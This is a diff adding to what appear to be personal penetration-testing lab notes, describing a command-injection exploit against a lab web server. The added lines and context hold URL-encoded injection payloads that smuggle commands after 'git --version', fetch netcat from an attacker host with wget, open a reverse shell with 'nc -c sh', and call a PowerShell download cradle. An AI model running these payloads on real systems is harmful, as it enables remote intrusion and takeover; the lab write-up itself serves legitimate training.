@@ -253,6 +253,15 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 When encoding payloads it looks like they encoded special characters, spaces... really everything except for the words and ('s )'s
 
+I did the following for one of the labs. Using the command injection I first attempted to create a shell using bash and netcat in the webservers /bin however I did not have permission. I did a pwd and noticed that my account name is "stanley".
+Since bash, sh, were not working I decided to try the other most obvious file download tool, wget. I spun up an http server and made a 1-liner to wget the payload from the attack http server, and then also to use nc to launch a connection to my box. nothing happened.
+After spending 10 minutes playing with various payloads to get it to work, I realized that the server potentially did not have permission to save files to the "/" directory. 
+
+This time I tried saving the payload to the users home folder
+git+--version%3Bwget+192.168.45.228%3a80/nc+-P+/home/stanley/nc
+
+This worked and allowed me to run the payload
+git+--version%3Bcd+/home/stanley/%3bnc%20-c%20sh%20192.168.45.228%204242
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
